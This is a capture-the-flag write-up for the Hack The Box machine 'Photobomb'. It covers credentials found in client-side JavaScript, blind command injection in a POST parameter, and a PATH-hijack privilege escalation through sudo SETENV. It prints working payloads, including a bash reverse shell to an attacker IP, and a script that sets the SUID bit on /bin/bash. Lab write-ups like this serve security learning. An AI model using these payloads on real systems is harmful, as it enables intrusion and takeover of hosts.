---
title: "HTB - Photobomb"
date: 2026-10-17 12:00:00 +0300
categories: [HTB, HTB-Linux]
tags: [command-injection, path-hijacking, sudo, credential-disclosure, javascript]
image:
  path: /assets/img/photobomb/banner.png
---

## Enumeration
### Nmap

A scan reveals two open ports: SSH on 22 and an Nginx web server on 80. The server redirected us to `photobomb.htb`, so we added it to `/etc/hosts` and ran the scan again.

```bash
nmap -sC -sV -p 22,80 photobomb.htb
```

```text
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Photobomb
|_http-server-header: nginx/1.18.0 (Ubuntu)
```

---

## Gaining Access

### Web Enumeration

The landing page is a simple homepage for a photo printing franchise. A "click here" link points to `/printer`, which sits behind HTTP basic authentication.

![photobomb-landing](/assets/img/photobomb/photobomb-landing.png)

We tried default credentials (`admin:admin`, `admin:password`) with no luck.

![photobomb-basic-auth](/assets/img/photobomb/photobomb-basic-auth.png)

Checking the page source, we found `photobomb.js` with credentials hardcoded :

```javascript
function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
  }
}
window.onload = init;
```

![photobomb-js-creds](/assets/img/photobomb/photobomb-js-creds.png)

The credentials `pH0t0:b0Mb!` worked, granting access to the `/printer` panel: a photo gallery where you select an image, file type, and dimensions, then download it for printing.

![photobomb-printer-panel](/assets/img/photobomb/photobomb-printer-panel.png)

### Command Injection

We intercepted a download request in Burp and noticed three POST parameters: `photo`, `filetype`, and `dimensions`.

![photobomb-burp-download](/assets/img/photobomb/photobomb-burp-download.png)

We attempted path traversal to read files like `/etc/passwd` through the `photo` parameter, but the application didn't serve anything outside its image directory.

Next we tested for command injection. The key was testing each parameter individually while keeping the others valid. The `filetype` parameter turned out to be vulnerable to blind command injection, confirmed first with a `sleep` payload:

```text
photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=jpg%0d%0asleep+5&dimensions=1000x1500
```

The server response was delayed by 5 seconds confirming execution.

![photobomb-sleep-confirm](/assets/img/photobomb/photobomb-sleep-confirm.png)

We further validated with a `ping` callback to our machine:

```text
photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=jpg%0d%0aping+-c+1+10.10.14.185&dimensions=1000x1500
```

![photobomb-ping-burp](/assets/img/photobomb/photobomb-ping-burp.png)

`tcpdump` caught the ICMP request confirming outbound connectivity.

![photobomb-tcpdump-icmp](/assets/img/photobomb/photobomb-tcpdump-icmp.png)

With blind execution and outbound access confirmed we sent a bash reverse shell:

```text
photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=jpg%0d%0abash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.185/4444+0>%261'&dimensions=1000x1500
```

![photobomb-revshell](/assets/img/photobomb/photobomb-revshell.png)

We got a  shell as `wizard`.

---

## Privilege Escalation

Checking sudo permissions, `wizard` can run `/opt/cleanup.sh` as root with no password, and the `SETENV` flag is set:

```bash
wizard@photobomb:~/photobomb$ sudo -l
```

![photobomb-sudo-l](/assets/img/photobomb/photobomb-sudo-l.png)

We inspected the script:

```bash
wizard@photobomb:~/photobomb$ cat /opt/cleanup.sh
```

![photobomb-cleanup-script](/assets/img/photobomb/photobomb-cleanup-script.png)


Every command in this script uses its full path (`/bin/cat`, `/usr/bin/truncate`) except `find` which is called by name alone. Since `SETENV` allows us to pass environment variables through sudo, we can hijack the `PATH` to make the script execute our own `find` instead of `/usr/bin/find`.

We created our own version of `find` in `/dev/shm`:

```bash
cat << 'EOF' > /dev/shm/find
#!/bin/bash
chmod u+s /bin/bash
EOF
chmod +x /dev/shm/find
```

Then ran the cleanup script with our modified PATH:

```bash
wizard@photobomb:/dev/shm$ sudo PATH=/dev/shm:$PATH /opt/cleanup.sh
```

The script ran our `find`, which set the SUID bit on `/bin/bash`:

```bash
wizard@photobomb:/dev/shm$ ls -al /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
```

![photobomb-suid-bash](/assets/img/photobomb/photobomb-suid-bash.png)

With SUID set, we dropped into a root shell:

```bash
wizard@photobomb:/dev/shm$ /bin/bash -p
bash-5.0# id
uid=1000(wizard) gid=1000(wizard) euid=0(root) groups=1000(wizard)
```
